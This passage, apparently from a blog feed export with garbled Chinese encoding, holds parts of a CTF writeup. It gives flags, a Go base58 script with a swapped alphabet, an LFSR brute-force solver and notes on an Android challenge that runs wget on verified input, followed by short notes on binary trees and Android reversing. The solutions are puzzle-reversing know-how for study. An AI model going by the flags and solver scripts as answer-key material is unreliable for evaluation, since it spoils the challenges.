chr((s[i] &gt;&gt; <span class="number">2</span>) ^ <span class="number">0x63</span>)</span><br><span class="line">print(<span class="string">"flag&#123;%s&#125;"</span> % flag)</span><br></pre></td></tr></table></figure>

<p>flag{G0d_Bless_Wuhan_&amp;<em>China_Growth!</em>}</p>
<h2 id="fxckï¼"><a href="#fxckï¼" class="headerlink" title="fxckï¼"></a>fxckï¼</h2><p>å¤ªç´¯äº†ï¼Œæ‰€ä»¥è¿™é“é¢˜éšä¾¿çœ‹äº†ä¸€ä¸‹ï¼Œçœ‹åˆ°base58ç‰¹å¾ï¼Œç›´æ¥è§£ç ï¼Œå‘ç°ä¸å¯¹ï¼Œä¸€æƒ³å…¶ä»–é¢˜éƒ½ä¸ç®€å•ï¼Œè¿™ä¸ªåº”è¯¥ä¹Ÿä¸ä¼šè¿™ä¹ˆç®€å•å§ï¼Œæ‰€ä»¥å°±æ²¡è€ƒè™‘æ¢è¡¨ã€‚æ¯”å®Œèµ›çœ‹äº†çœ‹ï¼Œè¿˜çœŸæ˜¯æ¢è¡¨è§£å¯†ï¼Œæˆ‘å“­äº†ã€‚ã€‚ã€‚ã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200316152415784.png" alt="image-20200316152415784"></p>
<p>è¿™æ®µæ˜¯æ±‚ä½™ï¼Œæˆ‘è°ƒäº†ä¸€ä¸‹ï¼Œå‘ç°ä¸æ˜¯ç›´æ¥æŠŠè¾“å…¥base58åŠ å¯†ï¼Œè¿˜åŠ äº†ç‚¹ä¸œè¥¿ï¼Œè¯´å®è¯ï¼Œä»”ç»†åˆ†æï¼Œæˆ‘æ²¡çœ‹æ‡‚è¿™æ®µä¼ªä»£ç ï¼Œæ±‚å¾—ä½™æ•°å’Œæˆ‘è·‘ç¨‹åºæ±‚å¾—ä¸ä¸€æ ·ï¼Œè‡ªé—­äº†ã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200316152611658.png" alt="image-20200316152611658"></p>
<p>æ¢è¡¨å’ŒåŠ å¯†ï¼Œä¸éš¾ã€‚</p>
<p>ç„¶åç”¨äº†brainfuckä»£ç ï¼Œç¬¬ä¸€æ¬¡é‡è§ï¼Œæ ¹æœ¬ä¸çŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œä½†æ˜¯æœ€åçš„æ¯”è¾ƒå­—ç¬¦ä¸²å¯ä»¥ç›´æ¥åŠ¨è°ƒdumpå‡ºæ¥ã€‚å› ä¸ºæ˜¯å¤ç°ï¼Œä¹Ÿç®€å•å­¦ä¹ äº†ä¸€ä¸‹è¿™ä¸ªåŠ å¯†ã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200316152754240.png" alt="image-20200316152754240"></p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200316152823755.png" alt="image-20200316152823755"></p>
<p>æ³¨é‡Šä¸­ç»™å‡ºäº†è¿™ä¸ªåŠ å¯†çš„è¿ç®—ç¬¦ã€‚</p>
<p>æ—¢ç„¶åˆç¢°åˆ°äº†base58ï¼Œå°±ç†Ÿæ‚‰ä¸€ä¸‹å§ï¼Œgoè¯­è¨€å†™è„šæœ¬ï¼Œå‚è€ƒ:<a href="https://blog.csdn.net/qq_45828877/article/details/103997621" target="_blank" rel="noopener">https://blog.csdn.net/qq_45828877/article/details/103997621</a></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"bytes"</span></span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"math/big"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> base58_table []<span class="keyword">byte</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Encrypt</span><span class="params">(input []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">	bInt := big.NewInt(<span class="number">0</span>).SetBytes(input)</span><br><span class="line">	fmt.Printf(<span class="string">"è¾“å…¥å­—èŠ‚çš„16è¿›åˆ¶è¡¨è¾¾:%x\n"</span>, bInt)</span><br><span class="line">	base := big.NewInt(<span class="number">58</span>)</span><br><span class="line">	zero := big.NewInt(<span class="number">0</span>)</span><br><span class="line">	mod := &amp;big.Int&#123;&#125;</span><br><span class="line">	<span class="keyword">var</span> result []<span class="keyword">byte</span></span><br><span class="line">	<span class="keyword">for</span> bInt.Cmp(zero) != <span class="number">0</span> &#123;</span><br><span class="line">		bInt.DivMod(bInt, base, mod)</span><br><span class="line">		fmt.Printf(<span class="string">"%x\n"</span>, mod)</span><br><span class="line">		result = <span class="built_in">append</span>(result, base58_table[mod.Int64()])</span><br><span class="line">	&#125;</span><br><span class="line">	ReverseByte(result)</span><br><span class="line">	fmt.Printf(<span class="string">"base58åŠ å¯†ç»“æœ:%s\n"</span>, result)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Decrypt</span><span class="params">(input []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">	result := big.NewInt(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> _, b := <span class="keyword">range</span> input &#123;</span><br><span class="line">		index := bytes.IndexByte(base58_table, b)</span><br><span class="line">		result.Mul(result, big.NewInt(<span class="number">58</span>))</span><br><span class="line">		result.Add(result, big.NewInt(<span class="keyword">int64</span>(index)))</span><br><span class="line">	&#125;</span><br><span class="line">	decodeByte := result.Bytes()</span><br><span class="line">	<span class="keyword">if</span> input[<span class="number">0</span>] == base58_table[<span class="number">0</span>] &#123;</span><br><span class="line">		decodeByte = <span class="built_in">append</span>([]<span class="keyword">byte</span>&#123;<span class="number">0x00</span>&#125;, decodeByte...)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(decodeByte)</span><br><span class="line">	fmt.Printf(<span class="string">"base58è§£å¯†ç»“æœ:%s"</span>, decodeByte)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReverseByte</span><span class="params">(input []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i, j := <span class="number">0</span>, <span class="built_in">len</span>(input)<span class="number">-1</span>; i &lt; j; i, j = i+<span class="number">1</span>, j<span class="number">-1</span> &#123;</span><br><span class="line">		input[i], input[j] = input[j], input[i]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	base58_table = []<span class="keyword">byte</span>(<span class="string">"ABCDEFGHJKLMNPQRSTUVWXYZ123456789abcdefghijkmnopqrstuvwxyz"</span>)</span><br><span class="line">	Encrypt([]<span class="keyword">byte</span>(<span class="string">"\x06"</span> + <span class="string">"flag&#123;63510cf7-2b80-45e1-a186-21234897e5cd&#125;"</span>))</span><br><span class="line">	Decrypt([]<span class="keyword">byte</span>(<span class="string">"4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe"</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200316153024371.png" alt="image-20200316153024371"></p>
<p>è·‘å‡ºæ¥ï¼Œå‘ç°ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ä¸ª<code>\x6</code>â€¦â€¦..</p>
<h2 id="clock"><a href="#clock" class="headerlink" title="clock"></a>clock</h2><p>æ¯”èµ›çš„æ—¶å€™åˆ†æå‡ºäº†æºç ï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŠ å¯†ï¼Œæ— ä»ä¸‹æ‰‹ã€‚</p>
<p>åå¾—çŸ¥æ˜¯LFSR(çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨)ï¼Œå¯å‚è€ƒï¼š</p>
<p>LFSRå…·ä½“å‚è€ƒï¼š</p>
<p><a href="https://www.anquanke.com/post/id/181811" target="_blank" rel="noopener">https://www.anquanke.com/post/id/181811</a></p>
<p><a href="https://xz.aliyun.com/t/3682" target="_blank" rel="noopener">https://xz.aliyun.com/t/3682</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/33920501" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33920501</a></p>
<p>writeupå’Œè„šæœ¬å‚è€ƒ:</p>
<p><a href="http://ctf.njupt.edu.cn/382.html#clock" target="_blank" rel="noopener">http://ctf.njupt.edu.cn/382.html#clock</a></p>
<p>è´´å‡ºé€†å‘çš„æºç (python3)å’Œçˆ†ç ´è„šæœ¬(goè¯­è¨€)å§ã€‚</p>
<p>ç¨‹åºä¸»è¦æºç ï¼š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">v4 = xxx</span><br><span class="line">v3 = xxx</span><br><span class="line">v2 = xxx</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> ii <span class="keyword">in</span> range(<span class="number">0x100000</span>):</span><br><span class="line">    v5 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        v7 = v4 &amp; <span class="number">0x17FA06</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> v7:</span><br><span class="line">            i ^= v7 &amp; <span class="number">1</span></span><br><span class="line">            v7 &gt;&gt;= <span class="number">1</span></span><br><span class="line">        v4 = (i ^ <span class="number">2</span> * v4) &amp; <span class="number">0x1FFFFF</span></span><br><span class="line">        v9 = v3 &amp; <span class="number">0x2A9A0D</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> v9:</span><br><span class="line">            j ^= v9 &amp; <span class="number">1</span></span><br><span class="line">            v9 &gt;&gt;= <span class="number">1</span></span><br><span class="line">        v3 = (j ^ <span class="number">2</span> * v3) &amp; <span class="number">0x3FFFFF</span></span><br><span class="line">        v11 = v2 &amp; <span class="number">0x5E5E6A</span></span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> v11:</span><br><span class="line">            k ^= v11 &amp; <span class="number">1</span></span><br><span class="line">            v11 &gt;&gt;= <span class="number">1</span></span><br><span class="line">        v2 = (k ^ <span class="number">2</span> * v2) &amp; <span class="number">0x7FFFFF</span></span><br><span class="line">        v13 = <span class="number">2</span> * v5</span><br><span class="line">        v14 = v3</span><br><span class="line">        <span class="keyword">if</span> v4 &amp; <span class="number">1</span>:</span><br><span class="line">            v14 = v2</span><br><span class="line">        v5 = v14 &amp; <span class="number">1</span> ^ v13</span><br><span class="line">    print(hex(v5))</span><br><span class="line">    result.append(v5)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>çˆ†ç ´è„šæœ¬ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lfsr</span><span class="params">(R, mask1, mask2 <span class="keyword">int64</span>, result *[100]<span class="keyword">uint8</span>, <span class="built_in">len</span> <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> x := <span class="number">0</span>; x &lt; <span class="built_in">len</span>; x++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">8</span>; j++ &#123;</span><br><span class="line">			i := R &amp; mask1</span><br><span class="line">			lastbit := <span class="keyword">uint8</span>(<span class="number">0</span>)</span><br><span class="line">			<span class="keyword">for</span> i != <span class="number">0</span> &#123;</span><br><span class="line">				lastbit ^= <span class="keyword">uint8</span>(i &amp; <span class="number">1</span>)</span><br><span class="line">				i &gt;&gt;= <span class="number">1</span></span><br><span class="line">			&#125;</span><br><span class="line">			R = (R&lt;&lt;<span class="number">1</span> ^ <span class="keyword">int64</span>(lastbit)) &amp; mask2</span><br><span class="line">			result[x] = result[x]&lt;&lt;<span class="number">1</span> ^ lastbit</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> output = [<span class="number">100</span>]<span class="keyword">uint8</span>&#123;<span class="number">95</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">255</span>, <span class="number">209</span>, <span class="number">96</span>, <span class="number">188</span>, <span class="number">166</span>, <span class="number">230</span>, <span class="number">219</span>, <span class="number">223</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">155</span>, <span class="number">169</span>,</span><br><span class="line">	<span class="number">138</span>, <span class="number">126</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">12</span>, <span class="number">249</span>, <span class="number">91</span>, <span class="number">39</span>, <span class="number">107</span>, <span class="number">104</span>, <span class="number">55</span>, <span class="number">207</span>,</span><br><span class="line">	<span class="number">65</span>, <span class="number">155</span>, <span class="number">197</span>, <span class="number">204</span>, <span class="number">81</span>, <span class="number">76</span>, <span class="number">22</span>, <span class="number">83</span>, <span class="number">208</span>, <span class="number">215</span>, <span class="number">13</span>, <span class="number">254</span>, <span class="number">14</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">29</span>,</span><br><span class="line">	<span class="number">42</span>, <span class="number">161</span>, <span class="number">92</span>, <span class="number">2</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">232</span>, <span class="number">201</span>, <span class="number">147</span>, <span class="number">19</span>, <span class="number">53</span>, <span class="number">216</span>, <span class="number">82</span>, <span class="number">144</span>, <span class="number">169</span>,</span><br><span class="line">	<span class="number">34</span>, <span class="number">193</span>, <span class="number">106</span>, <span class="number">0</span>, <span class="number">253</span>, <span class="number">224</span>, <span class="number">7</span>, <span class="number">46</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">226</span>, <span class="number">127</span>, <span class="number">164</span>, <span class="number">162</span>, <span class="number">54</span>, <span class="number">98</span>,</span><br><span class="line">	<span class="number">144</span>, <span class="number">141</span>, <span class="number">182</span>, <span class="number">174</span>, <span class="number">252</span>, <span class="number">64</span>, <span class="number">130</span>, <span class="number">19</span>, <span class="number">163</span>, <span class="number">242</span>, <span class="number">176</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">3</span>, <span class="number">19</span>, <span class="number">11</span>,</span><br><span class="line">	<span class="number">160</span>, <span class="number">121</span>, <span class="number">149</span>, <span class="number">44</span>, <span class="number">53</span>, <span class="number">17</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">equalNumSum</span><span class="params">(rResult *[100]<span class="keyword">uint8</span>, output [100]<span class="keyword">uint8</span>, <span class="built_in">len</span> <span class="keyword">int</span>)</span> <span class="params">(sum <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	sum = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> x := <span class="number">0</span>; x &lt; <span class="built_in">len</span>; x++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">8</span>; j++ &#123;</span><br><span class="line">			<span class="keyword">if</span> (rResult[x] &amp; <span class="number">1</span>) == (output[x] &amp; <span class="number">1</span>) &#123;</span><br><span class="line">				sum++</span><br><span class="line">			&#125;</span><br><span class="line">			rResult[x] &gt;&gt;= <span class="number">1</span></span><br><span class="line">			output[x] &gt;&gt;= <span class="number">1</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//fmt.Println(sum)</span></span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">guessR</span><span class="params">(mask1, mask2 <span class="keyword">int64</span>, restrict <span class="keyword">int</span>)</span> <span class="title">int64</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> result = [<span class="number">100</span>]<span class="keyword">uint8</span>&#123;&#125;</span><br><span class="line">	<span class="built_in">len</span> := <span class="number">100</span></span><br><span class="line">	maxLen := <span class="keyword">int64</span>(<span class="number">1</span> &lt;&lt; restrict)</span><br><span class="line">	cmpMax := <span class="number">0</span></span><br><span class="line">	rr := <span class="keyword">int64</span>(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> r := <span class="keyword">int64</span>(<span class="number">0</span>); r &lt; maxLen; r++ &#123;</span><br><span class="line">		lfsr(r, mask1, mask2, &amp;result, <span class="built_in">len</span>)</span><br><span class="line">		equalNumSum := equalNumSum(&amp;result, output, <span class="built_in">len</span>)</span><br><span class="line">		<span class="keyword">if</span> equalNumSum &gt; cmpMax &#123;</span><br><span class="line">			cmpMax = equalNumSum</span><br><span class="line">			rr = r</span><br><span class="line">			fmt.Println(rr, cmpMax)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(rr, cmpMax)</span><br><span class="line">	<span class="keyword">return</span> rr</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">brute_r1</span><span class="params">(r2, r3 [100]<span class="keyword">uint8</span>)</span> <span class="title">int64</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> r1 [<span class="number">100</span>]<span class="keyword">uint8</span></span><br><span class="line">	<span class="built_in">len</span> := <span class="number">1</span> &lt;&lt; <span class="number">21</span></span><br><span class="line">	<span class="keyword">var</span> c <span class="keyword">uint8</span></span><br><span class="line">	<span class="keyword">for</span> r := <span class="number">0</span>; r &lt; <span class="built_in">len</span>; r++ &#123;</span><br><span class="line">		lfsr(<span class="keyword">int64</span>(r), <span class="number">0x17f</span>a06, <span class="number">0x1fffff</span>, &amp;r1, <span class="number">100</span>)</span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">			<span class="keyword">for</span> k := <span class="number">7</span>; k &gt;= <span class="number">0</span>; k-- &#123;</span><br><span class="line">				s1 := (r1[i] &gt;&gt; k &amp; <span class="number">1</span>)</span><br><span class="line">				s2 := (r2[i] &gt;&gt; k &amp; <span class="number">1</span>)</span><br><span class="line">				s3 := (r3[i] &gt;&gt; k &amp; <span class="number">1</span>)</span><br><span class="line">				z := s2</span><br><span class="line">				<span class="keyword">if</span> s1 == <span class="number">1</span> &#123;</span><br><span class="line">					z = s3</span><br><span class="line">				&#125;</span><br><span class="line">				c = c&lt;&lt;<span class="number">1</span> ^ z</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> c != output[i] &#123;</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> i == <span class="number">99</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">int64</span>(r)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(r)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> r2Result = [<span class="number">100</span>]<span class="keyword">uint8</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">var</span> r3Result = [<span class="number">100</span>]<span class="keyword">uint8</span>&#123;&#125;</span><br><span class="line">	<span class="comment">//r2 := guessR(0x2a9a0d, 0x3fffff, 22)   //3324079</span></span><br><span class="line">	<span class="comment">//r3 := guessR(0x5E5E6A, 0x7fffff, 23)	 //4958299</span></span><br><span class="line">	r2 := <span class="number">3324079</span></span><br><span class="line">	r3 := <span class="number">4958299</span></span><br><span class="line">	lfsr(<span class="number">3324079</span>, <span class="number">0x2a9a0d</span>, <span class="number">0x3fffff</span>, &amp;r2Result, <span class="number">100</span>)</span><br><span class="line">	lfsr(<span class="number">4958299</span>, <span class="number">0x5E5E6A</span>, <span class="number">0x7fffff</span>, &amp;r3Result, <span class="number">100</span>)</span><br><span class="line">	fmt.Println(r2Result)</span><br><span class="line">	fmt.Println(r3Result)</span><br><span class="line">	r1 := brute_r1(r2Result, r3Result)</span><br><span class="line">	fmt.Printf(<span class="string">"flag&#123;%x%x%x&#125;"</span>, r1, r2, r3)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="GetFlag"><a href="#GetFlag" class="headerlink" title="GetFlag"></a>GetFlag</h2><p>æ¯”èµ›çš„æ—¶å€™è§‰å¾—å¿«å‡ºäº†ï¼Œä½†æ˜¯ä¸ä¼šé€šä¿¡å°±å¾ˆéš¾å—ï¼Œå¤ç°ä¸€éå§ã€‚</p>
<p>æ‰”åˆ°JEBé‡Œçœ‹çœ‹ã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200319114048514.png" alt="image-20200319114048514"></p>
<p>å¾€ä¸€ä¸ªæ–‡ä»¶é‡Œå†™äº†flagï¼Œè¿™æ ·çš„æ–¹å¼åˆ›å»ºçš„æ–‡ä»¶ä¼šåœ¨åº”ç”¨çš„ç§æœ‰ç›®å½•ä¸‹ã€‚æˆ‘ä»¬å®‰è£…è½¯ä»¶åˆ°æ‰‹æœºä¸Šï¼Œä½¿ç”¨adb shellæŸ¥çœ‹ã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200319120728403.png" alt="image-20200319120728403"></p>
<p>æœåŠ¡ç«¯ç›‘å¬8080ç«¯å£ã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200319114813854.png" alt="image-20200319114813854"></p>
<p>é€šè¿‡è¾“å…¥æµå¾—çš„ä¼ ç»™å®ƒçš„æ•°æ®ã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200319120127116.png" alt="image-20200319120127116"></p>
<p>è¿˜æœ‰æ¥æ”¶æ•°æ®çš„æ–¹æ³•ã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200319120203664.png" alt="image-20200319120203664"></p>
<p>é€šè¿‡è¾“å‡ºæµè¿”å›ä¸€ä¸ªéšæœºæ•°ã€‚ç„¶åå¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œäº†ä¸€äº›æ“ä½œã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200319120307536.png" alt="image-20200319120307536"></p>
<p>ä¸»è¦å°±æ˜¯checkpayloadæ–¹æ³•ã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200319120349230.png" alt="image-20200319120349230"></p>
<p>éªŒè¯mssageå’Œcheckï¼Œcheckæ˜¯éšæœºæ•°ä½œä¸ºå¯†é’¥çš„HmacSha1åŠ å¯†ã€‚</p>
<p>éªŒè¯é€šè¿‡å³å¯æ‰§è¡Œwget messageã€‚</p>
<p>æ²¡æœ‰ç¯å¢ƒäº†ï¼Œæ­äº†å‡ ä¸ªå°æ—¶ï¼Œè¿˜æ˜¯æ²¡æœ‰æˆåŠŸã€‚ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>CTFèµ›é¢˜writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>äºŒå‰æ ‘</title>
    <url>/2020/03/10/%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1-äºŒå‰æ ‘æ€§è´¨"><a href="#1-äºŒå‰æ ‘æ€§è´¨" class="headerlink" title="1. äºŒå‰æ ‘æ€§è´¨"></a>1. äºŒå‰æ ‘æ€§è´¨</h3><ul>
<li>äºŒå‰æ ‘æœ€å¤šæœ‰ä¸¤ä¸ªå­æ ‘ã€‚</li>
<li>äºŒå‰æ ‘ç¬¬iå±‚æœ€å¤šæœ‰$2^{i-1}$ä¸ªèŠ‚ç‚¹</li>
<li>æ·±åº¦ä¸ºkçš„äºŒå‰æ ‘è‡³å¤šæœ‰$2^k-1$ä¸ªèŠ‚ç‚¹</li>
<li>å¯¹ä»»ä¸€äºŒå‰æ ‘ï¼Œå¶å­èŠ‚ç‚¹ä¸ºn0ï¼Œåº¦ä¸º2çš„èŠ‚ç‚¹ä¸ºn2ï¼Œåˆ™n0=n2+1</li>
<li>åŒ…å«nä¸ªç»“ç‚¹çš„äºŒå‰æ ‘çš„é«˜åº¦è‡³å°‘ä¸º$log_2(n+1)$ã€‚</li>
</ul>
<h3 id="2-äºŒå‰æ ‘åˆ†ç±»"><a href="#2-äºŒå‰æ ‘åˆ†ç±»" class="headerlink" title="2. äºŒå‰æ ‘åˆ†ç±»"></a>2. äºŒå‰æ ‘åˆ†ç±»</h3><ul>
<li>å®Œå…¨äºŒå‰æ ‘â€”â€”å¶å­èŠ‚ç‚¹éƒ½åœ¨æœ€åº•ä¸‹ä¸¤å±‚ï¼Œæœ€åä¸€å±‚çš„å¶å­èŠ‚ç‚¹éƒ½é å·¦æ’åˆ—ï¼Œå¹¶ä¸”é™¤äº†æœ€åä¸€å±‚ï¼Œå…¶ä»–å±‚çš„èŠ‚ç‚¹ä¸ªæ•°éƒ½è¦è¾¾åˆ°æœ€å¤§ï¼Œè¿™ç§äºŒå‰æ ‘å«ä½œå®Œå…¨äºŒå‰æ ‘ã€‚</li>
<li>æ»¡äºŒå‰æ ‘â€”â€”å¶å­èŠ‚ç‚¹å…¨éƒ½åœ¨æœ€åº•å±‚ï¼Œé™¤äº†å¶å­èŠ‚ç‚¹ä¹‹å¤–ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰å·¦å³ä¸¤ä¸ªå­èŠ‚ç‚¹ï¼Œè¿™ç§äºŒå‰æ ‘å°±å«ä½œæ»¡äºŒå‰æ ‘ï¼Œä»–æ˜¯ä¸€ç§ç‰¹æ®Šçš„å®Œå…¨äºŒå‰æ ‘ã€‚</li>
<li>å¹³è¡¡äºŒå‰æ ‘â€”â€”å¹³è¡¡äºŒå‰æ ‘åˆè¢«ç§°ä¸ºAVLæ ‘ï¼ˆåŒºåˆ«äºAVLç®—æ³•ï¼‰ï¼Œå®ƒæ˜¯ä¸€æ£µäºŒå‰æ’åºæ ‘ï¼Œä¸”å…·æœ‰ä»¥ä¸‹æ€§è´¨ï¼šå®ƒæ˜¯ä¸€æ£µç©ºæ ‘æˆ–å®ƒçš„å·¦å³ä¸¤ä¸ªå­æ ‘çš„é«˜åº¦å·®çš„ç»å¯¹å€¼ä¸è¶…è¿‡1ï¼Œå¹¶ä¸”å·¦å³ä¸¤ä¸ªå­æ ‘éƒ½æ˜¯ä¸€æ£µå¹³è¡¡äºŒå‰æ ‘ã€‚</li>
</ul>
<h3 id="3-äºŒå‰æ ‘çš„éå†"><a href="#3-äºŒå‰æ ‘çš„éå†" class="headerlink" title="3. äºŒå‰æ ‘çš„éå†"></a>3. äºŒå‰æ ‘çš„éå†</h3><ul>
<li>å‰åºéå†<pre class="mermaid">graph LR
ç»“ç‚¹-->å·¦å­æ ‘
å·¦å­æ ‘-->å³å­æ ‘</pre></li>
<li>ä¸­åºéå†  <pre class="mermaid">graph LR
å·¦å­æ ‘-->ç»“ç‚¹
ç»“ç‚¹-->å³å­æ ‘</pre></li>
<li>ååºéå†  <pre class="mermaid">graph LR
å·¦å­æ ‘-->å³å­æ ‘
å³å­æ ‘-->ç»“ç‚¹</pre></li>
<li>å±‚æ¬¡éå†  <pre class="mermaid">graph LR
ç¬¬ä¸€å±‚-->ç¬¬äºŒå±‚
ç¬¬äºŒå±‚-->...
... -->ç¬¬Kå±‚</pre>





</li>
</ul>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
        <category>æ•°æ®ç»“æ„</category>
      </categories>
      <tags>
        <tag>æ•°æ®ç»“æ„</tag>
      </tags>
  </entry>
  <entry>
    <title>Androidé€†å‘åŸºç¡€</title>
    <url>/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>apkæ˜¯ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œåç¼€æ”¹ä¸ºzipå¯ä»¥è§£å‹å‡ºæ¥ã€‚</p>
<p><strong>AndroidMainfest.xml</strong></p>
